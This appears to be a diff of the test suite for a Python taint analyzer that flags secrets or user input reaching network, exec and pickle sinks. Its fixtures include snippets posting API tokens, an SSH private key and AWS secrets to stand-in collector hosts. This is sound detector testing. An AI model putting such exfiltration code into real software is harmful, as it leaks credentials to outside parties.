+            class Base:
+                def send(self):
+                    requests.post("https://x.invalid", data=self.token)
+            class Child(Base):
+                def __init__(self):
+                    self.token = os.getenv("API_TOKEN")
+            """
+        )
+        assert _summary(set_in_init) == sorted(
+            ("TT3", _line(set_in_init, marker)) for marker in ("# LOCAL", "# CLASS", "# CHILD")
+        )
+        # A base never reads a subclass's attributes (no shared hierarchy namespace).
+        assert _run(parent_reads) == []
+
+    def test_class_scope_defaults(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Client:
+                TOKEN = os.getenv("API_TOKEN")
+                def send(self, token=TOKEN):
+                    requests.post("https://x.invalid", data=token)  # SINK
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+
+class TestNotResolved:
+    """Calls whose callee is not known from syntax alone bind nothing, as on main.
+
+    Receiver type inference, the untyped-receiver fallback into every
+    same-named method, callback rules and ``@property`` reads were dropped:
+    each produced denial-of-service paths or false positives. Variable names
+    differ from the callee's parameters, so neither version reports these.
+    """
+
+    def test_instance_receivers_do_not_bind(self) -> None:
+        for setup, call in (
+            ("api = Api()", "api.upload(secret)"),
+            ("pass", "Api().upload(secret)"),
+            ("api = cast(Api, raw)", "api.upload(secret)"),
+            ("self.api = Api()", "self.api.upload(secret)"),
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                from typing import cast
+                class Api:
+                    def upload(self, body):
+                        requests.post("https://x.invalid", data=body)
+                class Runner:
+                    def main(self, raw):
+                        secret = os.getenv("API_TOKEN")
+                        {setup}
+                        {call}
+                """
+            )
+            assert _run(code) == [], call
+
+    def test_untyped_receivers_never_fan_out_to_same_named_methods(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            MODELS = {"small": "s"}
+            class Uploader:
+                def __init__(self, url):
+                    self.url = url
+                def format(self, record):
+                    return requests.post(self.url, json={"record": record}, timeout=10)
+                def get(self, model_id):
+                    return requests.get(f"https://models.invalid/{model_id}")
+            def banner():
+                user = os.environ.get("USER", "unknown")
+                return "Running as {}".format(user)
+            def selected_model(params):
+                params.get(os.environ.get("MODEL"))
+                return MODELS.get(os.environ.get("MODEL_SIZE", "small"))
+            """
+        )
+        assert _run(code) == []
+
+    def test_callbacks_do_not_bind(self) -> None:
+        for call in (
+            "threading.Thread(target=upload, args=(secret,)).start()",
+            "executor.submit(upload, secret)",
+            "setattr(Client, 'token', secret)",
+        ):
+            code = _code(
+                f"""
+                import os, requests, threading
+                def upload(body):
+                    requests.post("https://example.invalid", data=body)
+                class Client:
+                    def __init__(self, url, token=None):
+                        requests.post(url, data=token)
+                def main(executor):
+                    secret = os.getenv("API_KEY")
+                    {call}
+                """
+            )
+            assert _run(code) == [], call
+
+    def test_properties_and_class_name_attributes_are_not_resolved(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Config:
+                TOKEN = os.getenv("API_TOKEN")
+                @property
+                def key(self):
+                    return os.getenv("API_KEY")
+                def send(self):
+                    requests.post("https://x.invalid", data=self.key)
+            def send():
+                requests.post("https://x.invalid", data=Config.TOKEN)
+            """
+        )
+        assert _run(code) == []
+
+    def test_class_objects_reached_through_aliases_do_not_bind(self) -> None:
+        """Only ``ClassName.m(obj, ...)`` binds with the unbound offset; an alias
+        of the class binds nothing, as on main, so it cannot shift arguments."""
+        for call in (
+            "B.send(self, os.getenv('USER_NAME'), 'public')",
+            "self.__class__.send(self, os.getenv('USER_NAME'), 'public')",
+            "klass.send(self, os.getenv('USER_NAME'), 'public')",
+            "self.kls.send(self, os.getenv('USER_NAME'), 'public')",
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                class Base:
+                    def send(self, user, body):
+                        print(user)
+                        requests.post("https://x.invalid", data=body)
+                B = Base
+                class Child(Base):
+                    def __init__(self):
+                        self.kls = Base
+                    def run(self):
+                        klass = Base
+                        {call}
+                """
+            )
+            assert _run(code) == [], call
+
+    def test_subclass_overrides_are_not_followed_from_the_base(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Base:
+                def token(self):
+                    return "public"
+                def send(self):
+                    requests.post("https://x.invalid", data=self.token())
+            class Child(Base):
+                def token(self):
+                    return os.getenv("API_TOKEN")
+            """
+        )
+        assert _run(code) == []
+
+
+class TestScopes:
+    """Lambdas and comprehensions are scopes of their own, as in Python 3."""
+
+    def test_walrus_inside_a_lambda_does_not_shadow_a_global(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            TOKEN = os.getenv("API_TOKEN")
+            def send():
+                reset = lambda: (TOKEN := None)
+                requests.post("https://x.invalid", data=TOKEN)  # SINK
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+    def test_walrus_inside_a_comprehension_binds_in_the_function(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            TOKEN = os.getenv("API_TOKEN")
+            def send():
+                [(TOKEN := "public") for _ in range(1)]
+                requests.post("https://x.invalid", data=TOKEN)
+            """
+        )
+        assert _run(code) == []
+
+    def test_comprehension_shadowing_keeps_the_outer_name(self) -> None:
+        for comprehension in (
+            "[token for token in ('a', 'b')]",
+            "{token for token in ('a', 'b')}",
+            "{token: 1 for token in ('a', 'b')}",
+            "list(token for token in ('a', 'b'))",
+            "[t for _ in 'x' for token in 'y']",
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                token = os.getenv("API_TOKEN")
+                def send():
+                    labels = {comprehension}
+                    requests.post("https://x.invalid", data=token)  # SINK
+                """
+            )
+            assert _summary(code) == [("TT3", _line(code, "# SINK"))], comprehension
+
+    def test_first_iterable_is_read_in_the_enclosing_scope(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def send():
+                token = os.getenv("API_TOKEN")
+                body = [token for token in token]  # ASSIGN
+                requests.post("https://x.invalid", data=body)
+            """
+        )
+        (finding,) = _flows(code)
+        assert f"'body' from os.getenv (line {_line(code, '# ASSIGN')}," in finding.message
+
+    def test_global_declared_in_an_enclosing_function_is_global_in_nested_ones(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            TOKEN = os.getenv("API_TOKEN")
+            def outer():
+                TOKEN = "public"
+                def middle():
+                    global TOKEN
+                    def inner():
+                        requests.post("https://x.invalid", data=TOKEN)  # SINK
+                    inner()
+                middle()
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+
+class TestSourceRank:
+    """Each key keeps one source, the most severe; a helper can never downgrade it."""
+
+    def test_helper_defined_first_does_not_preempt_the_credential(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def nonce():
+                return requests.get("https://collector.invalid/nonce").text
+            def run():
+                token = os.getenv("API_KEY")
+                body = nonce() + token  # BODY
+                requests.post("https://collector.invalid/upload", data=body)
+            """
+        )
+        (finding,) = _run(code)
+        assert finding.rule_id == "TT3"
+        assert f"'body' from os.getenv (line {_line(code, '# BODY')}," in finding.message
+
+    def test_file_read_helper_does_not_preempt_the_credential(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def read_key():
+                return open(os.path.expanduser("~/.ssh/id_rsa")).read()
+            def collect():
+                aws = os.environ["AWS_SECRET_ACCESS_KEY"]
+                loot = {"key": read_key(), "aws": aws}
+                requests.post("https://collector.invalid/x", json=loot)
+            """
+        )
+        assert [f.rule_id for f in _run(code)] == ["TT3"]
+
+    def test_reassignment_keeps_the_most_severe_source_in_either_order(self) -> None:
+        """Each sink gets the most severe source for its kind, in either order."""
+        credential, file_read = 'os.getenv("KEY")', 'open("notes.txt").read()'
+        network, user = 'requests.get("https://x.invalid").text', 'input("cmd")'
+        for sources, network_rule, exec_rule in (
+            ((file_read, credential), "TT3", "TT2"),
+            ((network, credential), "TT3", "TT5"),
+            ((user, file_read), "TT4", "TT5"),
+            ((credential, user), "TT3", "TT5"),
+        ):
+            for first, second in (sources, sources[::-1]):
+                code = (
+                    "import os, requests\n"
+                    f"payload = {first}\n"
+                    f"payload = {second}\n"
+                    "body = payload\n"
+                    'requests.post("https://x.invalid", data=body)\n'
+                    "exec(body)\n"
+                )
+                rules = [f.rule_id for f in _run(code)]
+                assert rules == [network_rule, exec_rule], (first, second)
+
+    def test_a_helper_never_downgrades_execution_or_file_flows(self) -> None:
+        """A helper's credential cannot hide user input reaching exec (TT5), nor
+        a helper's network input a file read reaching the network (TT4)."""
+        execution = _code(
+            """
+            import os, pickle, requests, subprocess
+            def prefix():
+                return os.getenv("SHELL_PREFIX")
+            def run():
+                user = input("cmd> ")
+                cmd = prefix() + user  # CMD
+                subprocess.run(cmd, shell=True)
+                blob = requests.get("https://x.invalid/blob").content
+                data = prefix() + blob  # DATA
+                pickle.loads(data)
+            """
+        )
+        upload = _code(
+            """
+            import requests
+            def nonce():
+                return requests.get("https://x.invalid/nonce").text
+            def run():
+                notes = open("notes.txt").read()
+                body = nonce() + notes  # BODY
+                requests.post("https://x.invalid/upload", data=body)
+            """
+        )
+        assert [(f.rule_id, f.message.split(" (line")[0]) for f in _run(execution)] == [
+            ("TT5", "Tainted flow: 'cmd' from input"),
+            ("TT6", "Tainted flow: 'data' from requests.get"),
+        ]
+        assert [(f.rule_id, f.message.split(" (line")[0]) for f in _run(upload)] == [
+            ("TT4", "Tainted flow: 'body' from open"),
+        ]
+
+    def test_seeded_assignment_still_reads_a_more_severe_variable(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            token = os.getenv("API_KEY")
+            body = requests.get("https://x.invalid").text + token  # BODY
+            requests.post("https://x.invalid", data=body)
+            """
+        )
+        (finding,) = _run(code)
+        assert finding.rule_id == "TT3"
+        assert f"'body' from os.getenv (line {_line(code, '# BODY')}," in finding.message
+
+    def test_inline_sources_pick_the_most_severe(self) -> None:
+        """The credential is deeper in the expression than the network source."""
+        code = _code(
+            """
+            import os, requests
+            body = requests.get("https://x.invalid").text + os.getenv("KEY").strip()
+            requests.post("https://x.invalid", data=body)
+            exec(body)
+            """
+        )
+        assert [(f.rule_id, f.message.split(" (line")[0]) for f in _run(code)] == [
+            ("TT3", "Tainted flow: 'body' from os.getenv"),
+            ("TT5", "Tainted flow: 'body' from requests.get"),
+        ]
+
+    def test_new_flows_never_reorder_main_flows(self) -> None:
+        """A helper's equal source arriving first through a return does not win."""
+        code = _code(
+            """
+            import os, requests
+            def helper():
+                inner = os.environ["A"]
+                return inner
+            def run():
+                outer = os.getenv("B")
+                mid = outer
+                value = helper() + mid  # VALUE
+                requests.post("https://x.invalid", data=value)
+            """
+        )
+        (finding,) = _run(code)
+        assert finding.message == (
+            f"Tainted flow: 'value' from os.getenv (line {_line(code, '# VALUE')}, "
+            "credential/environment) → requests.post (network output)"
+        )
+
+    def test_equal_sources_keep_the_first_one_to_arrive(self) -> None:
+        """Ties are not reordered by the new flows: main's message is kept."""
+        code = _code(
+            """
+            import os, requests
+            def normalize(value):
+                return value.strip()
+            def run():
+                primary = os.environ["PRIMARY_TOKEN"]
+                fallback = os.getenv("FALLBACK_TOKEN")
+                token = normalize(primary)  # FIRST
+                if not token:
+                    token = fallback
+                requests.post("https://api.invalid/v1", headers={"Authorization": token})
+            """
+        )
+        (finding,) = _run(code)
+        assert finding.message == (
+            f"Tainted flow: 'token' from os.environ (line {_line(code, '# FIRST')}, "
+            "credential/environment) → requests.post (network output)"
+        )
+
+
 class TestMessageCompatibility:
-    """Messages keep the wording earlier releases used.
+    """Messages keep main's wording for every flow main also reports.
 
     Exact baseline fingerprints and message-glob baseline rules include the
-    message, so a flow both versions report must produce the same text: the
-    variable read at the sink and the line of the statement that last tainted
-    it (not the line of the original source call).
+    message: the variable read at the sink and the line of the statement that
+    last tainted it (not the line of the original source call).
     """
 
     def test_reassignment_chain_cites_the_last_assignment(self) -> None:
@@ -1429,20 +2284,32 @@ class TestMessageCompatibility:
         assert f"'payload' from os.getenv (line {_line(code, '# ASSIGN')}," in finding.message
 
     def test_plain_variable_is_cited_before_a_helper_result(self) -> None:
-        """A sink reading both a variable and a helper result cites the variable."""
         code = _code(
             """
             import os, subprocess
             def build(args):
                 return ["ssh", *args]
+            def host():
+                return input("host: ")
             args = input("args: ")
-            subprocess.run(build(args))
+            subprocess.run(build(args) + [host()])
             """
         )
         (finding,) = _flows(code, "TT5")
         assert finding.message == (
-            "Tainted flow: 'args' from input (line 4, user input) → subprocess.run (code execution)"
+            "Tainted flow: 'args' from input (line 6, user input) → subprocess.run (code execution)"
         )
+
+    def test_comprehension_at_the_sink_cites_the_outer_variable(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            parts = os.getenv("API_KEY").split(",")
+            requests.post("https://x.invalid", json=[p for p in parts])
+            """
+        )
+        (finding,) = _flows(code)
+        assert "'parts' from os.getenv (line 2," in finding.message
 
     def test_cross_function_flow_cites_the_binding_call(self) -> None:
         code = _code(
@@ -1458,141 +2325,442 @@ class TestMessageCompatibility:
         (finding,) = _flows(code)
         assert f"'payload' from os.getenv (line {_line(code, '# CALL')}," in finding.message
 
-
-class TestInterproceduralBounds:
-    """Call binding goes through per-callee argument slots, so it stays linear."""
-
-    def test_many_same_named_methods_and_call_sites_bind_linearly(self, monkeypatch) -> None:
-        """N methods named ``put`` and N ``obj.put(secret)`` calls: O(N), not O(N^2)."""
-        count = 400
-        classes = "\n".join(
-            f"class Store{i}:\n    def put(self, value):\n        return value"
-            for i in range(count)
+    def test_attributes_and_calls_are_named_as_the_sink_spells_them(self) -> None:
+        receiver = "client" + "_" * 200
+        code = _code(
+            f"""
+            import os, requests
+            class Client:
+                def __init__(self):
+                    self.token = os.getenv("API_TOKEN")
+                def send(self):
+                    requests.post("https://x.invalid", headers={{"X-Token": self.token}})
+            def main():
+                {receiver} = Client()
+                if not {receiver}.token:
+                    raise SystemExit(1)
+            """
         )
-        calls = "\n".join(f"    store{i}.put(secret)" for i in range(count))
-        code = (
-            "import os\n"
-            f"{classes}\n"
-            "def main(" + ", ".join(f"store{i}" for i in range(count)) + "):\n"
-            '    secret = os.getenv("API_KEY")\n'
-            f"{calls}\n"
-        )
-        calls_made = {"n": 0}
-        original = behavioral_taint_tracking._mark_targets
+        (finding,) = _flows(code)
+        assert "'self.token' from os.getenv (line 4," in finding.message
+        assert receiver not in finding.message
 
-        def counting_mark_targets(*args, **kwargs):
-            calls_made["n"] += 1
-            return original(*args, **kwargs)
 
-        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)
-        start = time.monotonic()
-        sources = _collect(code, _capped_check_runtime(count * 200))
-        elapsed = time.monotonic() - start
+# ── Resource bounds ─────────────────────────────────────────────────────
 
-        # Every method's parameter is reached through the shared argument slot.
-        assert sum(1 for key in sources if key.endswith(".<locals>.value")) == count
-        # A per-pair binding would fire count * count edges.
-        assert calls_made["n"] <= 10 * count
-        assert elapsed < 2.0
 
-    def test_positional_arguments_beyond_the_slot_cap_still_bind(self) -> None:
-        width = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS + 4
-        params = ", ".join(f"p{i}" for i in range(width))
-        args = ", ".join('os.getenv("API_KEY")' if i == width - 1 else str(i) for i in range(width))
-        code = (
-            "import os, requests\n"
-            f"def send({params}):\n"
-            f'    requests.post("https://example.invalid", data=p{width - 1})\n'
-            f"send({args})\n"
-        )
-        assert len(_flows(code)) == 1
+def _analyzer_code_objects() -> list:
+    """Every code object defined in the taint module (functions, methods, nested)."""
+    found: dict[int, object] = {}
+    pending: list = []
+    for value in vars(behavioral_taint_tracking).values():
+        if getattr(value, "__module__", None) != behavioral_taint_tracking.__name__:
+            continue
+        if isinstance(value, type):
+            for attribute in vars(value).values():
+                function = getattr(attribute, "__func__", attribute)
+                if hasattr(function, "__code__"):
+                    pending.append(function.__code__)
+                elif isinstance(attribute, property) and attribute.fget is not None:
+                    pending.append(attribute.fget.__code__)
+        elif hasattr(value, "__code__"):
+            pending.append(value.__code__)
+    while pending:
+        code = pending.pop()
+        if id(code) in found:
+            continue
+        found[id(code)] = code
+        pending.extend(const for const in code.co_consts if hasattr(const, "co_code"))
+    return list(found.values())
 
-    def test_key_memory_does_not_grow_with_identifier_length(self) -> None:
-        """Keys never embed qualified names, so memory is independent of name length.
+
+def _operations(code: str) -> int:
+    """Lines of the taint analyzer executed while analyzing *code*.
+
+    A deterministic work count: unlike wall-clock time it does not depend on
+    machine load, and unlike ``check_runtime`` calls it also counts loops that
+    never check the deadline.
+    """
+    monitoring = sys.monitoring
+    tool = next(candidate for candidate in (3, 4) if monitoring.get_tool(candidate) is None)
+    count = [0]
+
+    def on_line(code_object: object, line: int) -> None:
+        count[0] += 1
+
+    monitoring.use_tool_id(tool, "taint-operation-count")
+    codes = _analyzer_code_objects()
+    try:
+        monitoring.register_callback(tool, monitoring.events.LINE, on_line)
+        for code_object in codes:
+            monitoring.set_local_events(tool, code_object, monitoring.events.LINE)
+        _run(code)
+    finally:
+        for code_object in codes:
+            monitoring.set_local_events(tool, code_object, 0)
+        monitoring.register_callback(tool, monitoring.events.LINE, None)
+        monitoring.free_tool_id(tool)
+    return count[0]
+
+
+_ALL_SOURCES = (
+    "os.getenv('a') + os.environ.get('a') + open('f').read() + requests.get('u') "
+    "+ httpx.post('u') + urllib.request.urlopen('u') + input() + sys.stdin.read()"
+)
+
+
+def _class_redefinitions(n: int) -> str:
+    return "class C:0\n" * n + "C()\n" * n
+
+
+def _typed_redefinitions(n: int) -> str:
+    return "class C:\n def m(self, x): return x\n" * n + "c = C()\n" + "c.m(1)\n" * n
+
+
+def _nested_constructor_calls(n: int) -> str:
+    line = "C(" * 40 + "1" + ")" * 40 + "\n"
+    return "class C:pass\n" * n + "def C(*a):pass\n" + line * (n // 4)
+
+
+def _keyword_fanout(n: int) -> str:
+    return "def f(**kw):\n    pass\nf(" + "".join(f"k{i}=x," for i in range(n)) + ")\n"
+
+
+def _keyword_parameters(n: int) -> str:
+    params = ",".join(f"p{i}" for i in range(n))
+    return f"def f({params}):\n    pass\nf(" + "".join(f"p{i}=x," for i in range(n)) + ")\n"
+
+
+def _self_attributes(n: int) -> str:
+    body = "".join(f"        self.a{i} = y\n        z = self.a{i}\n" for i in range(n))
+    return f"class C:\n    def m(self, y):\n{body}"
+
+
+def _nested_closures(n: int) -> str:
+    lines = [" " * d + f"def f{d}(p{d}):" for d in range(40)]
+    lines += [" " * 40 + f"v{i} = w + p0" for i in range(n)]
+    return "\n".join(lines) + "\n"
+
+
+def _callback_arguments(n: int) -> str:
+    return (
+        "import threading\n"
+        "def f(*a, **kw):\n    pass\n"
+        "threading.Thread(target=f, args=(" + "x," * n + "))\n"
+        "ex.submit(f, " + "x," * n + ")\n"
+        "threading.Thread(target=f, kwargs={" + "".join(f"'k{i}': x," for i in range(n)) + "})\n"
+    )
+
+
+def _lambda_callee(n: int) -> str:
+    return (
+        "f = lambda *a, **k: a\nf("
+        + "x," * n
+        + ")\nf("
+        + "".join(f"k{i}=x," for i in range(n))
+        + ")\n"
+    )
+
+
+def _same_named_methods(n: int) -> str:
+    classes = "".join(f"class K{i}:\n    def m(self, **kw):\n        return kw\n" for i in range(n))
+    return classes + "def run(o, x):\n" + "".join(f"    o.m(k{i}=x)\n" for i in range(n))
+
+
+def _nested_class_constructors(n: int) -> str:
+    block = "class Outer:\n class C:\n  def __init__(self, a): pass\n x = C(1)\n"
+    return block * n
+
+
+def _nested_class_methods(n: int) -> str:
+    block = "class Outer:\n class C:\n  def m(self, a): pass\n c = C()\n c.m(1)\n"
+    return block * n
+
+
+def _hierarchy_constructors(n: int) -> str:
+    return "class B:\n pass\n" + "".join(
+        f"class D{i}(B):\n class C:\n  def __init__(self, a): pass\n x = C(1)\n" for i in range(n)
+    )
+
+
+def _variable_of_many_classes(n: int) -> str:
+    classes = "".join(f"class K{i}:\n def m(self, x): return x\n" for i in range(n))
+    return classes + "".join(f"c = K{i}()\n" for i in range(n)) + "c.m(1)\n" * n
+
+
+def _attribute_of_many_classes(n: int) -> str:
+    classes = "".join(f"class K{i}:\n def m(self, x): return x\n" for i in range(n))
+    init = "class H:\n def __init__(self):\n" + "".join(f"  self.x = K{i}()\n" for i in range(n))
+    return classes + init + " def go(self, v):\n" + "  self.x.m(v)\n" * n
+
+
+def _function_redefinitions(n: int) -> str:
+    return "def f(x): return x\n" * n + "f(1)\n" * n
+
+
+def _global_class_redefinitions(n: int) -> str:
+    defs = "".join(
+        f"def f{i}():\n global C\n class C:\n  def __init__(self, a): pass\n" for i in range(n)
+    )
+    return defs + "C(1)\n" * n
+
+
+def _attribute_callback_candidates(n: int) -> str:
+    return (
+        "".join(f"class C{i}:0\n" for i in range(n))
+        + "class H:\n def s(self):\n"
+        + "".join(f"  self.v=C{i}()\n" for i in range(n))
+        + " def r(self):\n  print("
+        + "self.v.m," * n
+        + ")\n"
+    )
+
+
+def _multi_class_loads(n: int) -> str:
+    return (
+        "".join(f"class C{i}:0\n" for i in range(n))
+        + "".join(f"x=C{i}()\n" for i in range(n))
+        + "y=x.a\n" * n
+    )
+
+
+def _every_source_in_many_locals(n: int) -> str:
+    body = "=".join(f"v{i}" for i in range(50)) + "=p\n"
+    return f"import os, sys, requests, httpx, urllib.request\ns = {_ALL_SOURCES}\n" + "".join(
+        f"def f{i}(p):\n p=s\n {body}f{i}(s)\n" for i in range(n)
+    )
+
+
+def _wide_assignment_in_nested_functions(n: int) -> str:
+    depth = 20
+    lines = ["import os, sys, requests, httpx, urllib.request\n", f"s = {_ALL_SOURCES}\n"]
+    lines += [" " * i + f"def f{i}(a{i}):\n" for i in range(depth)]
+    lines.append(" " * depth + "x=" * n + "+".join(f"a{i}" for i in range(depth)) + "\n")
+    lines += [" " * i + f"f{i}(a{i - 1})\n" for i in range(depth - 1, 0, -1)]
+    lines.append("f0(s)\n")
+    return "".join(lines)
+
+
+def _nested_callback_arguments(n: int) -> str:
+    return "def f(*a):0\n" + ("print(f," * n + "0" + ")" * n + "\n") * 20
+
+
+def _nested_in_file_calls(n: int) -> str:
+    return "def f(a):\n    return a\nx = input()\n" + ("f(" * n + "x" + ")" * n + "\n") * 20
+
+
+def _deep_inheritance(n: int) -> str:
+    out = []
+    for c in range(n):
+        out.append(f"def g{c}():\n")
+        for i in range(16):
+            bases = ",".join(f"K{j}" for j in range(i - 1, -1, -1))
+            head = f" class K{i}({bases}):\n" if bases else f" class K{i}:\n"
+            out.append(head + f"  def m{i}(self, a):\n   self.m0(a)\n   return self.v{i % 4}\n")
+    return "".join(out)
+
+
+def _deep_scopes(n: int) -> str:
+    return "z = " + "lambda: " * n + "[" + ",".join(f"n{i}" for i in range(200)) + "]\n"
+
+
+# Every denial-of-service repro from the two reviews of this change, scaled
+# down. Each must cost work linear in its size, so quadrupling the size may
+# at most about quadruple the analyzer's executed lines (a quadratic path
+# grows 16x).
+_DOS_SHAPES = {
+    "same_named_classes": (_class_redefinitions, 100),
+    "same_named_classes_typed": (_typed_redefinitions, 60),
+    "nested_constructor_calls": (_nested_constructor_calls, 80),
+    "keyword_fanout": (_keyword_fanout, 200),
+    "keyword_parameters": (_keyword_parameters, 150),
+    "self_attributes": (_self_attributes, 100),
+    "nested_closures": (_nested_closures, 100),
+    "callback_arguments": (_callback_arguments, 150),
+    "lambda_callee": (_lambda_callee, 150),
+    "same_named_methods": (_same_named_methods, 60),
+    "nested_class_constructors": (_nested_class_constructors, 60),
+    "nested_class_methods": (_nested_class_methods, 60),
+    "hierarchy_constructors": (_hierarchy_constructors, 60),
+    "variable_of_many_classes": (_variable_of_many_classes, 60),
+    "attribute_of_many_classes": (_attribute_of_many_classes, 60),
+    "function_redefinitions": (_function_redefinitions, 100),
+    "global_class_redefinitions": (_global_class_redefinitions, 60),
+    "attribute_callback_candidates": (_attribute_callback_candidates, 60),
+    "multi_class_loads": (_multi_class_loads, 80),
+    "every_source_in_many_locals": (_every_source_in_many_locals, 10),
+    "wide_assignment_in_nested_functions": (_wide_assignment_in_nested_functions, 200),
+    "nested_callback_arguments": (_nested_callback_arguments, 15),
+    "nested_in_file_calls": (_nested_in_file_calls, 15),
+    "deep_inheritance": (_deep_inheritance, 3),
+    "deep_scopes": (_deep_scopes, 20),
+}
+
+
+@pytest.mark.skipif(sys.version_info < (3, 12), reason="sys.monitoring needs Python 3.12")
+class TestResourceScaling:
+    """Work grows linearly with file size on every adversarial shape."""
+
+    @pytest.mark.parametrize("shape", sorted(_DOS_SHAPES))
+    def test_work_is_linear(self, shape: str) -> None:
+        generate, size = _DOS_SHAPES[shape]
+        small = _operations(generate(size))
+        large = _operations(generate(4 * size))
+        assert large <= 5 * small, (shape, small, large)
+
+
+class TestAdversarialInputs:
+    """Memory, output size and deadlines on adversarial inputs."""
+
+    def test_memory_does_not_grow_with_identifier_length(self) -> None:
+        """No key or message copies an identifier per reference.
 
         Taint keys built as ``qualname + name`` copied a long function, class or
-        method name into every local, attribute, argument slot and untyped
-        ``obj.m(...)`` fallback binding: memory grew as name length times
-        references, so a sub-megabyte file could exhaust host memory.
+        method name into every local, attribute and argument slot; messages
+        built from the first spelling of an attribute copied a long receiver
+        name into every sink. Memory then grew as name length times references.
         """
 
         def module(length: int) -> str:
-            function, cls, method = "f" * length, "C" * length, "m" * length
+            function, cls, method, receiver = "f" * length, "C" * length, "m" * length, "r" * length
             lines = [
-                "import os",
+                "import os, requests",
                 f"def {function}(*args, **kwargs):",
                 "    return args",
-                f"{function}(" + "x, " * 3000 + "y=x)",
+                f"{function}(" + "x, " * 2000 + "y=x)",
                 f"def {function}_locals():",
-                *(f"    v{i} = os.getenv('K')" for i in range(1500)),
+                *(f"    v{i} = os.getenv('K')" for i in range(1000)),
                 f"class {cls}:",
-                "    def store(self, y):",
-                *(f"        self.a{i} = y" for i in range(1500)),
-                *(
-                    f"class K{i}:\n    def {method}(self, a, b):\n        return a"
-                    for i in range(30)
-                ),
-                "def run(o, x):",
-                *(f"    o.{method}(x, os.getenv('K'))" for _ in range(40)),
+                f"    def {method}(self, y):",
+                "        self.a1 = os.getenv('K')",
+                *(f"        self.a{i} = y" for i in range(1000)),
+                "    def send(self):",
+                *("        requests.post('u', data=self.a1)" for _ in range(1000)),
+                f"{receiver} = {cls}()",
+                f"{receiver}.a1 = os.getenv('K')",
+                f"z = {receiver}.a1",
             ]
             return "\n".join(lines) + "\n"
 
-        def peak_bytes(code: str) -> int:
+        def analysis_peak(code: str) -> int:
+            """Peak memory of the analysis alone, after the source is parsed."""
             parsed = get_python_ast(None, code, "t.py")
-            type_map = build_type_map(parsed.tree, parsed.import_aliases)
             tracemalloc.start()
             try:
-                index = behavioral_taint_tracking._build_scope_index(
-                    parsed.tree, parsed.import_aliases, type_map
-                )
-                graph = behavioral_taint_tracking._TaintGraph(
-                    index, type_map, parsed.import_aliases
-                )
-                graph.run()
-                assert graph.facts  # the flows above do propagate
+                findings = behavioral_taint_tracking._analyze_python(parsed, "t.py")
+                assert len(findings) == 1000
                 return tracemalloc.get_traced_memory()[1]
             finally:
                 tracemalloc.stop()
 
-        short = peak_bytes(module(8))
-        long = peak_bytes(module(5000))
-        # Qualified keys would cost ~5000 bytes x ~9000 references (~45 MB) more.
-        assert long - short < 2 * 2**20
+        short = analysis_peak(module(8))
+        long = analysis_peak(module(4000))
+        # One copy per distinct local would already cost ~4000 bytes x 1000 (4 MB).
+        assert long - short < 2**20
 
-    def test_same_named_classes_resolve_each_call_once(self) -> None:
-        """Thousands of redefinitions of one class plus calls stay linear.
+    def test_message_bytes_do_not_grow_with_identifier_length(self) -> None:
+        """Messages name what the sink spells, never a long spelling from elsewhere.
 
-        Redefinitions of a name merge into one class, and method lookups are
-        cached, so ``C()`` / ``c.m(x)`` / ``C(x).m(x)`` cost the same whether
-        ``C`` is defined once or thousands of times.
+        An attribute read named after its first load site copied a 150,000-char
+        receiver into each of 10,000 findings (1.4 GB of messages for an 850 KB
+        file). Messages are built from the sink's own nodes, and identifiers
+        longer than ``_MAX_NAME_CHARS`` are shortened.
         """
-        count = 6000
-        definition = (
-            "class C:\n    def __init__(self, a):\n        self.a = a\n"
-            "    def m(self, x):\n        return x\n"
+        receiver = "R" * 20_000
+        sinks = 2_000
+        far_spelling = (
+            "import os, requests\n"
+            f"{receiver} = C()\n{receiver}.a = os.getenv('K')\nz = {receiver}.a\n"
+            "class C:\n    def __init__(self):\n        self.a = os.getenv('K')\n"
+            "    def m(self):\n" + "        requests.post('u', data=self.a)\n" * sinks
         )
-        code = definition * count + "c = C(1)\nc.m(1)\nC(2).m(2)\n" * count
-        parsed = get_python_ast(None, code, "t.py")
-        start = time.monotonic()
-        index = behavioral_taint_tracking._build_scope_index(
-            parsed.tree, parsed.import_aliases, {}, _capped_check_runtime(count * 200)
+        variable = "v" * 5_000
+        nested = "requests.post('u', data=" * 30 + variable + ")" * 30
+        long_at_the_sink = (
+            f"import os, requests\n{variable} = os.getenv('K')\n" + (nested + "\n") * 30
         )
-        behavioral_taint_tracking._TaintGraph(
-            index, {}, parsed.import_aliases, _capped_check_runtime(count * 200)
-        ).run()
-        elapsed = time.monotonic() - start
-        assert len(index.logical) == 1
-        # Each (class, method) is looked up once, however many calls use it.
-        assert len(index._methods) <= 4
-        assert elapsed < 4.0
+        for code, count in ((far_spelling, sinks), (long_at_the_sink, 30 * 30)):
+            findings = _run(code)
+            tainted = [f for f in findings if f.message.startswith("Tainted flow")]
+            assert len(tainted) == count
+            assert sum(len(f.message) for f in findings) <= 200 * len(findings)
 
-    def test_deadline_is_checked_while_indexing_scopes(self) -> None:
-        """Scope indexing checks the deadline per node, not only per function."""
-        parsed = get_python_ast(None, "x + 1\n" * 20000, "t.py")
-        with pytest.raises(_RuntimeBudgetError):
-            behavioral_taint_tracking._build_scope_index(
-                parsed.tree, parsed.import_aliases, {}, _capped_check_runtime(5000)
+    def test_identifiers_up_to_the_cap_are_reported_in_full(self) -> None:
+        cap = behavioral_taint_tracking._MAX_NAME_CHARS
+        for length, spelled in ((cap, "t" * cap), (cap + 1, "t" * (cap - 3) + "...")):
